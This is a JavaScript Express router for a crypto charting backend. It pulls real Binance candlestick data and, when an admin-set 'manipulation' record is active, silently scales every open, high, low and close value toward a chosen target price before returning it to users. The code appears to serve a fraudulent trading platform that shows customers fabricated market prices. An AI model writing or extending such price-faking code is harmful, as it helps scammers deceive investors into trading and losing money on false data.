const express = require('express');
const axios = require('axios');
const MarketPrice = require('../MarketPrice');
const router = express.Router();

// Fetch klines (candlestick) data from Binance
router.get('/klines', async (req, res) => {
  const { symbol, interval, limit } = req.query;
  console.log(`[CHARTS] Received request for ${symbol} with interval ${interval}`);

  // Validate required parameters
  if (!symbol || !interval) {
    return res.status(400).json({ message: 'Symbol and interval are required' });
  }

  // Validate interval
  const validIntervals = ['1m', '5m', '15m', '1h', '4h', '1d', '1w'];
  if (!validIntervals.includes(interval)) {
    return res.status(400).json({ message: 'Invalid interval' });
  }

  try {
    // Construct the Binance API URL
    const binanceUrl = 'https://api.binance.com/api/v3/klines';

    // Fetch data from Binance
    const response = await axios.get(binanceUrl, {
      params: {
        symbol: symbol.replace('/', ''),
        interval: interval,
        limit: limit || 100,
      },
    });

    const data = response.data;
    console.log(`[CHARTS] Fetched ${data.length} candles from Binance.`);

    // Check if there's an active price manipulation for this symbol
    const marketPrice = await MarketPrice.findOne({ symbol: symbol.replace('/', '') });
    let manipulatedData = data;

    if (marketPrice && marketPrice.manipulation && marketPrice.manipulation.isActive) {
      console.log('[CHARTS] Active manipulation found for symbol:', symbol);
      const manip = marketPrice.manipulation;
      const startTime = new Date(manip.startTime);
      const endTime = new Date(manip.endTime);
      const now = new Date();

      // Check if the manipulation is currently active by seeing if 'now' is within the manipulation time window
      if (now >= startTime && now <= endTime) {
        console.log('[CHARTS] Manipulation is currently active. Scaling entire chart...');

        if (data && data.length > 0) {
          const totalDuration = endTime - startTime;
          const timeSinceStart = now - startTime;
          const progress = Math.min(timeSinceStart / totalDuration, 1);

          const startPrice = manip.originalPrice;
          const targetPrice = manip.endValue;
          const priceDifference = targetPrice - startPrice;
          const currentManipulatedPrice = startPrice + (priceDifference * progress);

          console.log(`[CHARTS] Current manipulation progress: ${Math.round(progress * 100)}%`);
          console.log(`[CHARTS] Current ideal manipulated price: ${currentManipulatedPrice}`);

          // Get the last candle's close price to calculate the scaling ratio
          const lastCandle = data[data.length - 1];
          const originalLastClose = parseFloat(lastCandle[4]);

          // Calculate the ratio to scale the entire chart.
          // This makes the past data smoothly lead up to the current manipulated price.
          const ratio = originalLastClose > 0 ? currentManipulatedPrice / originalLastClose : 1;
          console.log(`[CHARTS] Scaling ratio to apply to chart: ${ratio}`);

          manipulatedData = data.map((candle) => {
            // Apply the ratio to all OHLC values for all candles
            return [
              candle[0], // timestamp
              (parseFloat(candle[1]) * ratio).toString(), // open
              (parseFloat(candle[2]) * ratio).toString(), // high
              (parseFloat(candle[3]) * ratio).toString(), // low
              (parseFloat(candle[4]) * ratio).toString(), // close
              candle[5], // volume
            ];
          });
          console.log(`[CHARTS] Finished scaling all ${data.length} candles based on active manipulation.`);
        }
      } else {
        console.log('[CHARTS] Manipulation is not currently active (now is outside the manipulation window).');
      }
    } else {
      console.log('[CHARTS] No active manipulation found for symbol:', symbol);
    }

    // Format the data for lightweight-charts and include ISO timestamp
    const formattedData = manipulatedData.map((d) => ({
      time: Math.floor(d[0] / 1000), // seconds
      timestamp: new Date(d[0]).toISOString(),
      open: parseFloat(d[1]),
      high: parseFloat(d[2]),
      low: parseFloat(d[3]),
      close: parseFloat(d[4]),
      volume: parseFloat(d[5]) || 0,
    }));

    res.json({ symbol, interval, data: formattedData });
  } catch (error) {
    console.error('Error fetching klines data:', error?.message || error);
    res.status(500).json({ message: 'Server error fetching chart data', error: error.message });
  }
});

module.exports = router;
